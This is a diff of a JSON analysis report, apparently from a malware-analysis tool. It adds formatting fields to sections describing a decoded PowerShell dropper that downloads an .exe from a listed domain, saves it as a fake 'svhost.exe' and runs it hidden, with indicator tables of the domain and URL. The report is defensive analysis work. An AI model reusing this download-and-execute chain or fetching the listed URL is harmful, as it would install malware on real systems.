@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": "[System.Net.WebClient.DownloadFile] Download From: https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe --> Save To: ./APPDATA/svhost.exe\n\n[Start-Process] ./APPDATA/svhost.exe\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -42,6 +43,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"oiartzunirratia.eus\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://oiartzunirratia.eus/install/clean/lcovlccdxd.exe\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/install/clean/lcovlccdxd.exe\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 1,
@@ -74,6 +81,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -85,6 +93,7 @@
       {
         "auto_collapse": false,
         "body": "Marks: Net.WebClient, DownloadFile",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -107,6 +116,7 @@
       {
         "auto_collapse": false,
         "body": "Marks: Start-Process",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -129,6 +139,7 @@
       {
         "auto_collapse": false,
         "body": "Marks: WindowStyle, Hidden, -W, Hidden",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -151,6 +162,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -173,6 +185,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"oiartzunirratia.eus\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://oiartzunirratia.eus/install/clean/lcovlccdxd.exe\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/install/clean/lcovlccdxd.exe\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
